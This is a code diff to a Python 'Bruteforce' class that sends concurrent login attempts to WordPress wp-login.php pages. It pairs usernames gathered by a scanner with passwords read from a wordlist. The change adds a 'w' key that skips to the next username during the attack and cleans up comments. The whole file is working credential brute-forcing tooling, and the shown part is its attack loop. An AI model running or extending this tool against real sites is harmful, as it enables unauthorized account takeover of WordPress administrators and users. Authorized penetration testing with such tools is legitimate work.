@@ -14,11 +14,15 @@ class Bruteforce:
         self.__passwords = self.set_passwords()
         self.__logins = scanner.logins
         self.__admin = scanner.admin
-        self.__stop = False  # Add a stop flag
+        self.__stop = False
         self.next = False
+        self.__nextuser = False
 
-    def stop(self, e=None):  # Add a method to set the stop flag
+    def stop(self, e=None):
         self.__stop = True
+
+    def set_nextuser(self, e=None):
+        self.__nextuser = True
 
     def set_passwords(self, filepath="src/db/passwords.txt"):
         with open(filepath, "r") as file:
@@ -54,7 +58,8 @@ class Bruteforce:
         return url
 
     def __sign_in(self, session, username, password):
-        keyboard.on_press_key("q", self.stop)  # Stop on 'q' key press
+        keyboard.on_press_key("q", self.stop)
+        keyboard.on_press_key("w", self.set_nextuser)
 
         slug: str = "wp-login.php"
         login_data = {
@@ -118,17 +123,23 @@ class Bruteforce:
             passwords = self.passwords
         self.__stop = False  # Reset the stop flag
         print("Press 'q' to stop the bruteforce.")
+        print("Press 'w' to skip to the next user.")
         with ThreadPoolExecutor(max_workers=max_workers) as executor:
             with requests.Session() as session:
                 for username in usernames:
                     if self.__stop:  # Check the stop flag
                         print("Bruteforce stopped.")
                         break
+
                     if executor._shutdown:
                         break
                     tasks = []
                     for password in passwords:
                         if self.__stop:  # Check the stop flag
+                            break
+                        if self.__nextuser:
+                            print("Skipping to the next user.")
+                            self.__nextuser = False
                             break
                         task = executor.submit(
                             self.__sign_in, session, username, password
